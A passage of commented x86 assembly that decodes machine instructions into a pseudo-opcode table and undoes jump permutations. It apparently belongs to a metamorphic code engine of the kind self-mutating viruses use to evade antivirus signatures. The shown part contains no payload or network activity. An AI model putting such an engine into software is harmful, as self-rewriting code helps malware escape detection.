                cmp     eax, 0F5h       ; CMC?
                jz    @@NOP
                cmp     eax, 0F6h       ; NOT and NEG?
                jz    @@SomeNotVeryCommon8
                cmp     eax, 0F7h
                jz    @@SomeNotVeryCommon32
                cmp     eax, 0FDh   ; One-byters that have not been decoded
                jbe   @@NOP         ; are set as NOP
                cmp     eax, 0FEh       ; INC/DEC Mem8?
                jz    @@INCDECMem8
                cmp     eax, 0FFh       ; INC/DEC/PUSH Mem?
                jz    @@INCDECPUSHMem32
                mov     eax, 0FFh       ; Set NOP if any instruction hasn't
     @@SetOneByteInstruction:           ; fit the conditions above
                mov     [edi], eax

                add     edi, 10h        ; Increase the storadge EIP and the
                inc     esi             ; disassembly EIP by 1
     @@ContinueDissasembly:
                jmp   @@LoopTrace       ; Treat next instruction

;;;; GENERIC OPCODE
; This kind of construction is very common among the opcodes. This is the way
; Intel codes the instructions that uses the Reg,Reg, Mem,Reg and Reg,Mem
; operands. The operations coded under this ones are ADD, OR, ADC, SBB, AND,
; SUB, XOR and CMP.
     @@GenericOpcode:
                and     eax, 7     ; Get the register
                cmp     eax, 3     ; Check the type of instruction. If it's
                jbe   @@Gen_NormalOpcode  ; Mem,Reg, Reg,Mem or Reg,Reg, jump.
                cmp     eax, 4     ; Check if it's an OP with AL
                jz    @@Gen_UsingAL
                cmp     eax, 5     ; Check if it's an OP with EAX
                jz    @@Gen_UsingEAX
                mov     eax, [esi] ; Check if the opcode is 0F, the opcode
                and     eax, 0FFh  ; that is used for some extended operations
                cmp     eax, 0Fh
                jz    @@Opcode0F
                jmp   @@SetOneByteInstruction ; Set the instruction.

        @@Gen_NormalOpcode:
                or      eax, eax   ; Check Mem8,Reg8
                jz    @@Gen_8b_MemReg
                cmp     eax, 1     ; Check Mem,Reg
                jz    @@Gen_32b_MemReg
                cmp     eax, 2     ; Check Reg8,Mem8
                jz    @@Gen_8b_RegMem

        @@Gen_32b_RegMem:
                mov     eax, [esi+1]
                and     eax, 0C0h
                cmp     eax, 0C0h  ; Check Reg,Reg
                jz    @@Gen_32b_ReglReg
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 8Bh         ; Get the opcode
                jnz   @@Gen_32b_RegMem_0 ; If it isn't MOV, jump
                mov     eax, 40h+2       ; Set MOV Reg,Mem
                jmp   @@Gen_GenMem       ; Jump to decode the instruction
        @@Gen_32b_RegMem_0:
                and     eax, 38h         ; Get the operation in pseudo-asm
                add     eax, 2           ; Set the "Reg,Mem" mode
        @@Gen_GenMem:
                mov     edx, [edi]       ; Get the data around the pseudoopcode
                and     edx, 0FFFFFF00h  ; Set the opcode
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi+1]     ; Get the data of the x86 opcode
                and     eax, 38h         ; Get the register involved
                shr     eax, 3
                mov     [edi+7], eax     ; Store it at +7 in the pseudo-instr.
                mov     edx, esi         ; Set in EDX the offset of the memory
                add     edx, 1           ; construction
                call    DecodeMemoryConstruction ; Decode it
                add     esi, ebx         ; Add the length of the memory field
                add     esi, 1           ; to ESI
                jmp   @@NextInstruction

        @@Gen_32b_MemReg:
                mov     eax, [esi+1]   ; Get the second opcode
                and     eax, 0C0h      ; Check if it's Reg,Reg operation
                cmp     eax, 0C0h
                jz    @@Gen_32b_lRegReg ; If it is, jump to decode it
                mov     eax, [esi]
                and     eax, 0FFh      ; Get the opcode
                cmp     eax, 85h       ; Check if it's TEST
                jnz   @@Gen_32b_MemReg_0
                mov     eax, 48h+3     ; If it is, store a TEST opcode
                jmp   @@Gen_GenMem
        @@Gen_32b_MemReg_0:
;                 cmp     eax, 87h     ; This is XCHG, but we aren't using
;                 jnz   @@Gen_32b_MemReg_1 ; it, so it's disabled.
;                 mov     eax, 48h+6
;                 jmp   @@Gen_GenMem
        @@Gen_32b_MemReg_1:
                cmp     eax, 89h       ; Check if it's MOV Mem,Reg
                jnz   @@Gen_32b_MemReg_2
                mov     eax, 40h+3     ; Set MOV Mem,Reg if it is
                jmp   @@Gen_GenMem
        @@Gen_32b_MemReg_2:
                and     eax, 38h       ; Get the pseudoopcode
                add     eax, 3
                jmp   @@Gen_GenMem     ; Jump to set it and decode the rest

        @@Gen_32b_ReglReg:
                call    GenOp_SetRegReg ; Decode the Reg,Reg instruction
        @@Gen_GenReglReg:
                mov     eax, [esi+1]  ; Get the source register
                and     eax, 7
                mov     [edi+1], eax  ; Set it on the disassembly
                mov     eax, [esi+1]  ; Get the destiny register and set it
                and     eax, 38h
                shr     eax, 3
                mov     [edi+7], eax
                add     esi, 2
                jmp   @@NextInstruction

        @@Gen_32b_lRegReg:
                call    GenOp_SetRegReg ; Decode the Reg,Reg instruction
        @@Gen_GenlRegReg:
                mov     eax, [esi+1]  ; Get the registers and store them in
                and     eax, 7        ; their appropiated fields
                mov     [edi+7], eax
                mov     eax, [esi+1]
                and     eax, 38h
                shr     eax, 3
                mov     [edi+1], eax
                add     esi, 2
                jmp   @@NextInstruction

        @@Gen_8b_RegMem:
                mov     eax, [esi+1]   ; Get the OP Reg,Mem
                and     eax, 0C0h
                cmp     eax, 0C0h      ; Check first if it's OP Reg,Reg
                jz    @@Gen_8b_ReglReg ; If it is, jump
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 8Ah       ; MOV Reg8,Mem8?
                jnz   @@Gen_8b_RegMem_0
                mov     eax, 40h+82h   ; Set MOV Reg8,Mem8
                jmp   @@Gen_GenMem     ; Jump to decode the memory address
        @@Gen_8b_RegMem_0:
                and     eax, 38h
                add     eax, 82h       ; Get the operation and set it
                jmp   @@Gen_GenMem

        @@Gen_8b_MemReg:
                mov     eax, [esi+1]   ; Get the operation
                and     eax, 0C0h      ; Check if it's OP Mem,Reg
                cmp     eax, 0C0h
                jz    @@Gen_8b_lRegReg ; If it is, jump
                mov     eax, [esi]
                and     eax, 0FFh      ; Get the opcode
                cmp     eax, 84h       ; If it's TEST...
                jnz   @@Gen_8b_MemReg_0
                mov     eax, 48h+83h   ; ...set it
                jmp   @@Gen_GenMem
        @@Gen_8b_MemReg_0:
;                 cmp     eax, 86h     ; This is XCHG 8 bits, but it's disabled
;                 jnz   @@Gen_8b_MemReg_1 ; because we don't use this type of
;                 mov     eax, 48h+86h    ; instructions
;                 jmp   @@Gen_GenMem
        @@Gen_8b_MemReg_1:
                cmp     eax, 88h       ; Check if it's MOV Mem,Reg
                jnz   @@Gen_8b_MemReg_2
                mov     eax, 40h+83h   ; Set it if it's MOV Mem,Reg
                jmp   @@Gen_GenMem
        @@Gen_8b_MemReg_2:
                and     eax, 38h       ; Get the OP
                add     eax, 83h
                jmp   @@Gen_GenMem     ; Set it and jump to decode the memory
                                       ; reference

        @@Gen_8b_lRegReg:
                call    GenOp_SetRegReg ; Decode the OP Reg8,Reg8 opcode
                mov     eax, [edi]      ; Set the 8 bits operation
                add     eax, 80h
                mov     [edi], eax
                jmp   @@Gen_GenlRegReg  ; Decode the rest of the instruction

        @@Gen_8b_ReglReg:
                call    GenOp_SetRegReg ; Decode the OP Reg8,Reg8
                mov     eax, [edi]      ; Set 8 bits instruction
                add     eax, 80h
                mov     [edi], eax
                jmp   @@Gen_GenReglReg  ; Decode the rest of the instruction

        @@Gen_UsingAL:
                mov     eax, [esi]    ; Get the operation
                and     eax, 38h
                add     eax, 80h
                mov     edx, [edi]    ; Set the opcode
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                xor     eax, eax
                mov     eax, [esi+1]  ; Get the Imm
                and     eax, 0FFh     ; Extend the sign
                cmp     eax, 7Fh
                jbe   @@Gen_UsingAL_01
                add     eax, 0FFFFFF00h
          @@Gen_UsingAL_01:
                add     esi, 2        ; Increase EIP and set the value
                jmp   @@Gen_SetValue

        @@Gen_UsingEAX:
                mov     eax, [esi]    ; Get the instruction
                and     eax, 38h
                mov     edx, [edi]    ; Set the opcode
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi+1]  ; Set the value
                add     esi, 5

        @@Gen_SetValue:
                mov     [edi+7], eax
                xor     eax, eax      ; Set the register (EAX)
                mov     [edi+1], eax
                jmp   @@NextInstruction


;;;; INC Reg

    @@Op_INC:   and     eax, 7        ; Get the register of the INC
                mov     [edi+1], eax  ; Set it
                xor     eax, eax      ; Pseudoopcode (ADD)
                jmp   @@Op_GenINCDEC

;;;; DEC Reg

    @@Op_DEC:   and     eax, 7        ; Get the register of the DEC
                mov     [edi+1], eax  ; Set it
                mov     eax, 28h      ; Pseudoopcode (SUB)
         @@Op_GenINCDEC:
                mov     edx, [edi]    ; Set the pseudoopcode
                and     edx, 0FFFFFF00h
                and     eax, 0FFh
                add     eax, edx
                mov     [edi], eax
                mov     eax, 1        ; Set the value of addition/subtraction
                mov     [edi+7], eax
                add     esi, 1        ; Increase the EIP
                jmp   @@NextInstruction

;;;; PUSH Reg & POP Reg

  @@Op_PUSHPOP: and     eax, 7        ; Get the register of the opcode
                mov     [edi+1], eax  ; Set it
                mov     eax, [esi]
                and     eax, 58h      ; Get the instruction (PUSH or POP)
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax   ; Set it
                add     esi, 1
                jmp   @@NextInstruction

;;;; PUSH Value

  @@Op_PUSHValue:
                mov     [edi], eax   ; Set the opcode
                mov     eax, [esi+1] ; Get the value
                mov     [edi+7], eax
                add     esi, 5       ; Add the length of the instr. to the EIP
                jmp   @@NextInstruction

;;;; PUSH SignedValue

  @@Op_PUSHSignedValue:
                mov     eax, 68h     ; Set the opcode 68h
                mov     [edi], eax
                mov     eax, [esi+1] ; Get the value to PUSH
                and     eax, 0FFh    ; Extend the sign
                cmp     eax, 7Fh
                jbe   @@Op_PUSHSignedValue_01
                add     eax, 0FFFFFF00h
                ;movsx   eax, byte ptr [esi+1]
         @@Op_PUSHSignedValue_01:
                mov     [edi+7], eax ; Set the value
                add     esi, 2       ; Increase the EIP
                jmp   @@NextInstruction


;;;; GENERIC OPCODE (2nd part)
;; This opcodes are the 80h-83h ones, which are used for "OP [Mem],Value" or
;; "OP Reg,Value". Moreover, opcodes 84-85 are also decoded here (the ones that
;; make TEST).
      @@GenericOpcode2:
                and     eax, 1     ; Get if it's a 8 bits or 32 bits operation
                or      eax, eax
                jz    @@Gen2_8b    ; Jump if it's 8 bits
      @@Gen2_32b:
                mov     eax, [esi+1]    ; Get the operation performed
                and     eax, 38h
                mov     edx, [edi]      ; Set it as pseudoopcode
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                mov     eax, [esi]
                and     eax, 2          ; Get if the operation uses a DWORD or
                or      eax, eax        ; a sign-extended byte
                jnz   @@Gen2_Gen_Signed
      @@Gen32Value:
                mov     eax, [esi+1]    ; Get it we use Reg,Reg
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@Gen2_32b_Register
                mov     eax, [edi]      ; Get the opcode
                add     eax, 4          ; Set OP Mem,Imm
                mov     [edi], eax
                mov     edx, esi        ; Decode the memory construction
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx        ; Add the length of the rest of the
                mov     eax, [esi+1]    ; instruction to get the value OPed
                sub     esi, ebx        ; Subtract it because later we'll add
                add     esi, 3          ; it again.
                jmp   @@Gen2_Gen_Memory

      @@Gen2_32b_Register:
                mov     eax, [esi+2]    ; Get the value
                mov     [edi+7], eax    ; Set it
                mov     eax, [esi+1]    ; Get the operation opcode
                add     esi, 6          ; Add the length of the instruction
                jmp   @@Gen2_Gen_Register

      @@Gen2_8b:
                mov     eax, [esi+1]    ; Get the 2nd opcode
                and     eax, 38h        ; Extract the operation and set it as
                add     eax, 80h        ;  a 8 bits pseudooperation.
                mov     edx, [edi]      ; Set it
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
      @@Gen2_Gen_Signed:
      @@Gen8Value:
                mov     eax, [esi+1]    ; Get the 2nd opcode
                and     eax, 0C0h
                cmp     eax, 0C0h       ; If we use a register, jump
                jz    @@Gen2_8b_Register
                mov     eax, [edi]      ; Set "Mem" usage
                add     eax, 4
                mov     [edi], eax
                mov     edx, esi        ; Decode the memory address
                add     edx, 1
                call    DecodeMemoryConstruction
                xor     eax, eax        ; Get the Imm of the operation in EAX
                add     esi, ebx
                mov     eax, [esi+1]
                sub     esi, ebx
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Gen8Value_01
                add     eax, 0FFFFFF00h
          @@Gen8Value_01:

      @@Gen2_Gen_Memory:
                mov     [edi+7], eax    ; Set it in the pseudoinstruction
                add     esi, ebx
                add     esi, 2          ; Increase EIP and decode the next
                jmp   @@NextInstruction ; instruction.

      @@Gen2_8b_Register:
                mov     eax, [esi+2]    ; Get the Imm and extend the sign
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@Gen2_8b_Register_01
                add     eax, 0FFFFFF00h
         @@Gen2_8b_Register_01:
                mov     [edi+7], eax    ; Set it in the pseudo-instruction
                mov     eax, [esi+1]    ; Get the 2nd opcode
                add     esi, 3          ; Add the length of the instruction
      @@Gen2_Gen_Register:              ; to EIP
                and     eax, 7          ; Get the register of the instruction
                mov     edx, [edi+1]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax    ; Set the register
                jmp   @@NextInstruction ; Decode the next instruction


;;;; LEA decoding

     @@LEA:     mov     eax, 0FCh      ; Set the pseudoopcode of LEA
                mov     [edi], eax
                mov     edx, esi
                add     edx, 1         ; Decode the memory address
                call    DecodeMemoryConstruction
                mov     eax, [esi+1]
                and     eax, 38h       ; Get the destiny register and set it
                shr     eax, 3
                mov     [edi+7], eax
                add     esi, ebx
                add     esi, 1          ; Add the length of the instruction to
                jmp   @@NextInstruction ; the EIP.

;;;; POP Mem decoding

     @@POPMem:  mov     eax, [esi+1]  ; Get the operand
                and     eax, 0C0h     ; Get if we use reg or memory address
                cmp     eax, 0C0h
                jz    @@POPMem_butReg
                mov     eax, 59h      ; If we use a memory address, set the
                mov     [edi], eax    ; opcode and decode the memory address
                mov     edx, esi
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 1
                jmp   @@NextInstruction
     @@POPMem_butReg:                 ; If it uses a register, set it
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax
                mov     eax, 58h      ; Set the opcode
                mov     edx, [edi]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi], eax
                add     esi, 2
                jmp   @@NextInstruction

;;;; XCHG With EAX:
;; Disabled since we aren't coding XCHG

;      @@XCHGWithEAX:
;                 mov     al, [esi]
;                 add     esi, 1
;                 cmp     eax, 90h
;                 jz    @@NOP
;                 and     eax, 7
;                 mov     [edi+1], al
;                 mov     eax, 48h+5
;                 mov     [edi], al
;                 xor     eax, eax
;                 mov     [edi+7], eax
;                 jmp   @@NextInstruction

;; NOP instruction

     @@NOP:     mov     eax, 0FFh  ; Set the NOP pseudoopcode
                mov     [edi], eax
                add     esi, 1
                jmp   @@NextInstruction

;;;; MOV AL/EAX,Mem
; This one is also disabled, because we doesn't have direct memory operations
; to disassemble.
;      @@MOVALMem:
;                 mov     eax, 0C2h
;      @@MOVxAxMem:
;                 mov     [edi], eax
;                 mov     eax, 8
;                 mov     [edi+1], eax
;                 mov     [edi+2], eax
;                 xor     eax, eax
;                 mov     [edi+7], eax
;                 mov     eax, [esi+1]
;                 mov     [edi+3], eax
;                 add     esi, 5
;                 jmp   @@NextInstruction
;      @@MOVEAXMem:
;                 mov     eax, 42h
;                 jmp   @@MOVxAxMem

;;;; MOV Mem,AL/EAX

;      @@MOVMemAL:
;                 mov     eax, 0C3h
;                 jmp   @@MOVxAxMem
;      @@MOVMemEAX:
;                 mov     eax, 43h
;                 jmp   @@MOVxAxMem

;;;; TEST AL,Value decodification

     @@TESTALValue:
                mov     eax, [esi+1]  ; Get the value
                and     eax, 0FFh
                mov     ecx, eax      ; Put it in ECX
                mov     eax, 0C8h     ; Put the pseudoopcode in EAX
                add     esi, 2
     @@TESTxAxValue:
                mov     [edi], eax    ; Set the pseudoopcode
                xor     eax, eax      ; Set the register
                mov     [edi+1], eax
                mov     [edi+7], ecx  ; Set the value
                jmp   @@NextInstruction

;;;; TEST EAX,Value

     @@TESTEAXValue:
                mov     ecx, [esi+1]  ; Get the Imm in ECX
                mov     eax, 48h      ; 48h = TEST pseudoopcode
                add     esi, 5        ; Increase the EIP
                jmp   @@TESTxAxValue

;;;; MOV Reg,Value decodification

     @@MOVRegValue:
                mov     eax, 40h      ; 40h = MOV pseudoopcode
                mov     [edi], eax
                mov     ecx, [esi+1]  ; Get the value in ECX
                mov     eax, [esi]
                add     esi, 5
     @@MOVRegValue_Common:
                and     eax, 7        ; Get the register in EAX
                mov     [edi+1], eax  ; Set the register
                mov     [edi+7], ecx  ; Set the value
                jmp   @@NextInstruction
     @@MOVReg8Value:
                mov     eax, 0C0h
                mov     [edi], eax    ; C0 = MOV 8 bits
                mov     eax, [esi+1]  ; Get the Imm to move
                and     eax, 0FFh
                mov     ecx, eax
                mov     eax, [esi]    ; Get the opcode to extract the register
                add     esi, 2
                jmp   @@MOVRegValue_Common

;;;; ROL/ROR/etc. decodification

      @@BitShifting32:
                mov     eax, 0F0h     ; Pseudoopcode SHIFT
      @@BitShifting_Common:
                mov     [edi], eax    ; Set the pseudoopcode
                mov     eax, [esi+1]  ; Get the 2nd opcode
                and     eax, 38h      ; Extract the operation
                mov     edx, [edi+8]  ; Set it at +8 in the instruction
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+8], eax
                mov     eax, [esi+1]  ; Get the operand type
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@BS32_Reg      ; If it's a Reg, jump
                mov     eax, [edi]
                add     eax, 1
                mov     [edi], eax    ; Set SHIFT Mem,x
                mov     edx, esi
                add     edx, 1        ; Decode the memory operand
                call    DecodeMemoryConstruction
       @@BS32_Common:
                mov     eax, [esi]    ; Get the opcode
                and     eax, 0FFh
                cmp     eax, 0D0h     ; Check if it's SHIFT,1 or SHIFT,x
                jb    @@BS32_GetNumber ; If it's ,x jump
                mov     eax, 1        ; Set 1 as shifting value
                sub     esi, 1
                jmp   @@BS32_SetNumber
       @@BS32_GetNumber:
                add     esi, ebx      ; Get the value of shifting
                mov     eax, [esi+1]
                sub     esi, ebx
       @@BS32_SetNumber:
                and     eax, 1Fh      ; Trim the bits ignored implicitly
                mov     edx, [edi+7]  ; Set the shifting value (byte) at +7
                and     edx, 0FFFFFF00h  ; in the disassembly of the instr.
                add     eax, edx
                mov     [edi+7], eax
                add     esi, ebx
                add     esi, 2
                jmp   @@NextInstruction
       @@BS32_Reg:
                mov     eax, [esi+1]  ; Get the register
                and     eax, 7
                mov     [edi+1], eax  ; Set it
                mov     ebx, 1        ; Jump to finish the decoding
                jmp   @@BS32_Common

       @@BitShifting8:
                mov     eax, 0F2h     ; Set SHIFT8
                jmp   @@BitShifting_Common

;;;; MOV [Mem8],Value (or MOV Reg8,Value) decoding (opcode C6)

       @@MOVMem8Value:
                mov     eax, 0C4h     ; Set the opcode as MOV Mem8,xxx
                mov     [edi], eax
                mov     eax, [esi+1]  ; Get the 2nd opcode
                and     eax, 0C0h     ; Register or memory address?
                cmp     eax, 0C0h
                jz    @@MOVMem8_RegValue  ; If register, jump
                mov     edx, esi
                add     edx, 1        ; Decode the memory address
                call    DecodeMemoryConstruction
                add     esi, ebx      ; Add the length of the operand
                add     esi, 1
       @@MOVMem8Value_Common:
                mov     eax, [esi]    ; Get the value we are moving
                and     eax, 0FFh     ; Extend the sign
                cmp     eax, 7Fh
                jbe   @@MOVMem8Value_01
                add     eax, 0FFFFFF00h
          @@MOVMem8Value_01:
                mov     [edi+7], eax  ; Set it in the pseudoinstruction
                add     esi, 1
                jmp   @@NextInstruction
       @@MOVMem8_RegValue:
                mov     eax, 0C0h     ; C0 = MOV Reg8,Imm
                mov     [edi], eax    ; Set the pseudoopcode
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax  ; Set the register
                add     esi, 2
                jmp   @@MOVMem8Value_Common ; Jump to finish the decoding

;;;; MOV [Mem32],Value (or MOV Reg32,Value) decoding (opcode C7)

       @@MOVMem32Value:
                mov     eax, 44h      ; 44h = MOV Mem,Imm (in our assembler)
                mov     [edi], eax    ; Set the pseudoopcode
                mov     eax, [esi+1]  ; Get the 2nd opcode
                and     eax, 0C0h
                cmp     eax, 0C0h     ; Memory address or register?
                jz    @@MOVMem32_RegValue  ; Jump if it's register
                mov     edx, esi
                add     edx, 1        ; Decode the memory address
                call    DecodeMemoryConstruction
                add     esi, ebx      ; Add the operand length
                add     esi, 1
                mov     eax, [esi]    ; Get the Imm to move
                mov     [edi+7], eax  ; Set it in the disassembly
                add     esi, 4        ; Increase the EIP
                jmp   @@NextInstruction
      @@MOVMem32_RegValue:
                mov     eax, 40h      ; 40h = MOV Reg32,Imm32
                mov     [edi], eax    ; Set the pseudoopcode
                mov     eax, [esi+1]
                and     eax, 7
                mov     [edi+1], eax  ; Get the register and set it
                mov     eax, [esi+2]  ; Get the immediate value and set it
                mov     [edi+7], eax
                add     esi, 6        ; Add the instruction length to the EIP
                jmp   @@NextInstruction

;;;; Some not very common instructions
;; Opcodes F6 and F7 are used for TEST, NOT, NEG, MUL, IMUL, DIV and IDIV.
;; Since MUL and up aren't used by us, we only decode TEST, NOT and NEG.
    @@SomeNotVeryCommon8:
                mov     eax, [esi+1]  ; Get the operation
                and     eax, 38h
                or      eax, eax      ; 0 is TEST
                jz    @@TEST8Value
                shr     eax, 1        ; If it's not TEST, it is NOT or NEG
                add     eax, 0DAh     ; EAX = E2/E6
    @@SNVC_Gen: mov     [edi], eax    ; Set the opcode
                mov     eax, [esi+1]  ; Check if we use register or memory
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@NOTNEGReg8    ; If register, jump
                mov     eax, [edi]    ; Set memory usage
                add     eax, 1
                mov     [edi], eax
                mov     edx, esi      ; Decode the memory address operand
                add     edx, 1
                call    DecodeMemoryConstruction
                add     esi, ebx      ; Add the length of the operand
                add     esi, 1
                jmp   @@NextInstruction
    @@NOTNEGReg8:
                mov     eax, [esi+1]  ; Get the register involved
                and     eax, 7
                mov     edx, [edi+1]
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax  ; Set it
                add     esi, 2        ; Increase the EIP
                jmp   @@NextInstruction

    @@SomeNotVeryCommon32:
                mov     eax, [esi+1]  ; Get the operation
                and     eax, 38h
                or      eax, eax      ; If it's TEST, jump to disasm it
                jz    @@TEST32Value
                shr     eax, 1
                add     eax, 0D8h     ; E0/E4
                jmp   @@SNVC_Gen      ; Jump to decode the rest of the instr.

    @@TEST8Value:
                mov     eax, 0C8h     ; Set TEST 8 bits opcode
                mov     [edi], eax
                jmp   @@Gen8Value     ; Jump to decode the rest

    @@TEST32Value:
                mov     eax, 48h      ; Set TEST 32 bits opcope
                mov     [edi], eax
                jmp   @@Gen32Value    ; Jump to decode the rest

;;;; INC Mem, DEC Mem, CALL Mem, JMP Mem & PUSH Mem disassembly

    @@INCDECMem8:
                mov     eax, [esi+1]  ; Get the operation
                and     eax, 38h
                or      eax, eax      ; INC?
                jz    @@INCMem8       ; Then, jump
    @@DECMem8:  mov     eax, 0ACh     ; ACh = Opcode of SUB Mem8,Imm8
      @@INCDECMem8_Next:
                mov     [edi], eax    ; Set the opcode
                mov     eax, [esi+1]  ; Get the type of operand
                and     eax, 0C0h
                cmp     eax, 0C0h     ; If we use a register operand, jump
                jz    @@INCDECReg8
      @@INCDECPUSH_Gen:
                mov     edx, esi      ; Here if we use INC/DEC/PUSH Mem
                add     edx, 1        ; Decode the memory operand
                call    DecodeMemoryConstruction
                add     esi, ebx
                add     esi, 1
                mov     eax, 1        ; We insert a 1 as a Imm even if it's 
                mov     [edi+7], eax  ; PUSH, JMP or CALL, since we will
                                      ; ignore this field for them
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 0EBh     ; Did we decode JMP DWORD PTR [xxx]?
                jnz   @@NextInstruction  ; Then, get a new EIP (treat it as
                                         ; a RET)
                add     edi, 10h      ; Increase the storadge EIP and get a
                jmp   @@GetEIPFromFutureLabelList ; new disassembly EIP (ESI)
    @@INCDECReg8:
                mov     eax, [edi]    ; Get the opcode
                sub     eax, 4        ; Convert it to OP Reg
                mov     [edi], eax
                mov     eax, [esi+1]  ; Get the register
                and     eax, 7
                mov     [edi+1], eax  ; Set it in the instruction
                mov     eax, 1        ; Set "1" value for addition and
                mov     [edi+7], eax  ; subtraction
                add     esi, 2
                jmp   @@NextInstruction
    @@INCMem8:  mov     eax, 84h      ; Set ADD Mem8,Imm8
                jmp   @@INCDECMem8_Next

;; Opcode FF: INC Mem, DEC Mem, CALL Mem, JMP Mem and PUSH Mem (32 bits)

    @@INCDECPUSHMem32:
                mov     eax, [esi+1]  ; Get the operand type
                and     eax, 38h
                or      eax, eax      ; INC?
                jz    @@INCMem32
                cmp     eax, 08h      ; DEC?
                jz    @@DECMem32
                cmp     eax, 10h      ; CALL?
                jz    @@CALLMem32
                cmp     eax, 20h      ; JMP?
                jz    @@JMPMem32
       @@PUSHMem32:
                mov     eax, [esi+1]  ; Decode PUSH. Look if it uses a reg.
                and     eax, 0C0h     ; or a memory address
                cmp     eax, 0C0h
                jz    @@PUSHMem32_Reg
                mov     eax, 51h      ; EAX = 51h, pseudoopcode of PUSH Mem
                mov     [edi], eax
                jmp   @@INCDECPUSH_Gen
       @@PUSHMem32_Reg:
                mov     eax, 50h      ; 50h = Opcode of PUSH Reg
       @@INCDECPUSH_GenMem32_Reg:
                mov     [edi], eax    ; Set the opcode
                mov     eax, [esi+1]  ; Get the operand register
                and     eax, 7
                mov     [edi+1], eax
                mov     eax, 1        ; Set "1" as immediate value (for INCs
                mov     [edi+7], eax  ; and DECs, and ignored for the others)
                add     esi, 2
                mov     eax, [edi]    ; Get the opcopde
                and     eax, 0FFh
                cmp     eax, 0EDh     ; Did we decode JMP Reg?
                jnz   @@NextInstruction
                add     edi, 10h      ; If so, treat it as a RET
                jmp   @@GetEIPFromFutureLabelList

       ;; Here if we decoded INC
       @@INCMem32:
                mov     eax, [esi+1]  ; Get the opcode
                and     eax, 0C0h     ; Check if it uses a register or a
                cmp     eax, 0C0h     ; memory address as operand
                jz    @@INCReg32
                mov     eax, 4        ; If Mem, set ADD Mem,Imm
                jmp   @@INCDECMem8_Next
       @@INCReg32:
                xor     eax, eax      ; If Reg, set ADD Reg,Imm
                jmp   @@INCDECPUSH_GenMem32_Reg

       ;; Here if we decoded DEC
       @@DECMem32:
                mov     eax, [esi+1]  ; Get if it uses a memory address or
                and     eax, 0C0h     ; a register
                cmp     eax, 0C0h
                jz    @@DECReg32
                mov     eax, 2Ch      ; Set SUB Mem,Imm
                jmp   @@INCDECMem8_Next
       @@DECReg32:
                mov     eax, 28h      ; Set SUB Reg,Imm
                jmp   @@INCDECPUSH_GenMem32_Reg

       ;; Here if we decoded CALL Mem (or CALL Reg)
       @@CALLMem32:
                mov     eax, [esi+1]
                and     eax, 0C0h     ; Get the type of operand
                cmp     eax, 0C0h
                jz    @@CALLMem32_Reg
                mov     eax, 0EAh     ; Set CALL Mem
                mov     [edi], eax
                jmp   @@INCDECPUSH_Gen
       @@CALLMem32_Reg:
                mov     eax, 0ECh     ; Normally APIs
                jmp   @@INCDECPUSH_GenMem32_Reg
       @@JMPMem32:
                mov     eax, [esi+1]
                and     eax, 0C0h
                cmp     eax, 0C0h
                jz    @@JMPMem32_Reg
                mov     eax, 0EBh    ; Normally to simulate RET, so treat it
                mov     [edi], eax   ; as a RET (after decoding)
                jmp   @@INCDECPUSH_Gen
       @@JMPMem32_Reg:
                mov     eax, 0EDh    ; Treat it also as a RET (coz it's a jump
                jmp   @@INCDECPUSH_GenMem32_Reg ; with undefined destiny)

     @@NextInstruction:
                add     edi, 10h     ; Increase storadge EIP
                jmp   @@ContinueDissasembly

;;;; RET disassembly

     @@RET:     mov     eax, 0FEh   ; Insert the opcode
                mov     [edi], eax
                inc     esi
                add     edi, 10h    ; Increase the storing EIP and get a new
                jmp   @@GetEIPFromFutureLabelList ; EIP for ESI. If there
                                                  ; aren't more, finish.

;;;; JMP SHORT

     @@JMP8:    mov     eax, [esi+1] ; Get the displacement
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@JMP8_01
                add     eax, 0FFFFFF00h
          @@JMP8_01:
                add     eax, 2       ; Add the length of the instruction to
                add     eax, esi     ; the read EIP
                jmp   @@JMP_Next01

;;;; JMP LONG
     @@JMP:     mov     eax, [esi+1] ; Get the displacement
                add     eax, 5
                add     eax, esi

;; The jump is stored as 0E9h,dd IndexOnLabelTable. By this way, if we change
;; the offset of the label, we only have to update the address at the table,
;; and all the references are automatically updated.
     @@JMP_Next01:
                mov     ebx, [ebp+InstructionTable]
                cmp     ebx, edi
                jz    @@NoInstructions
           @@FindDestinyInTable:
                cmp     [ebx+0Ch], eax  ; Check with the pointer to the real
                jz    @@SetLabel        ; instruction, and set label if we
                                        ; found it.
                add     ebx, 10h
                cmp     ebx, edi
                jnz   @@FindDestinyInTable
       @@NoInstructions:
                mov     ecx, 0FFh       ; Set a NOP if we didn't disassembled
                mov     [edi], ecx      ; yet the instruction. So, change the
                add     edi, 10h        ; read EIP (at ESI) directly without
                mov     esi, eax        ; inserting the jump. In this way,
                jmp   @@LoopTrace       ; the disassembling is automatically
                                        ; eliminating the permutations.
       @@SetLabel:
                mov     ecx, 0E9h       ; Set JMP pseudoopcode
                mov     [edi], ecx
                mov     edx, esi        ; Set the new pointer
                mov     [edi+0Ch], edx
                add     edi, 10h
                push    eax
                mov     eax, [esi]      ; Get the instruction
                and     eax, 0FFh
